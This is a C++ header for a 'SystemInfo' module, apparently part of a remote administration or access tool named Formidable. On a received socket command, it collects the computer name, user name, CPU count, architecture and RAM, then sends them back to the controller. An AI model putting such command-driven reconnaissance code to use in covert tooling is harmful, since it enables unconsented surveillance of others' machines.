#ifndef SYSTEM_INFO_MODULE_H
#define SYSTEM_INFO_MODULE_H
#include "../../Common/Module.h"
#include <windows.h>
#include <sstream>
namespace Formidable {
    class SystemInfoModule : public IModule {
    public:
        std::string GetModuleName() override { return "SystemInfo"; }
        void Execute(SOCKET s, CommandPkg* pkg) override {
            if (pkg->cmd == CMD_GET_SYSINFO) {
                std::string info = CollectInfo();
                PkgHeader header;
                memcpy(header.flag, "FRMD26?", 7);
                header.originLen = (int)info.size();
                header.totalLen = sizeof(PkgHeader) + header.originLen;
                send(s, (char*)&header, sizeof(PkgHeader), 0);
                send(s, info.c_str(), (int)info.size(), 0);
            }
        }
    private:
        std::string CollectInfo() {
            std::stringstream ss;
            char buffer[MAX_PATH];
            DWORD size = sizeof(buffer);
            if (GetComputerNameA(buffer, &size)) ss << "Computer: " << buffer << "\n";
            size = sizeof(buffer);
            if (GetUserNameA(buffer, &size)) ss << "User: " << buffer << "\n";
            SYSTEM_INFO sysInfo;
            GetSystemInfo(&sysInfo);
            ss << "Processors: " << sysInfo.dwNumberOfProcessors << "\n";
            ss << "Architecture: " << (sysInfo.wProcessorArchitecture == 9 ? "x64" : "x86") << "\n";
            MEMORYSTATUSEX memStatus;
            memStatus.dwLength = sizeof(memStatus);
            if (GlobalMemoryStatusEx(&memStatus)) {
                ss << "Total RAM: " << memStatus.ullTotalPhys / (1024 * 1024) << " MB\n";
            }
            return ss.str();
        }
    };
}
#endif // SYSTEM_INFO_MODULE_H
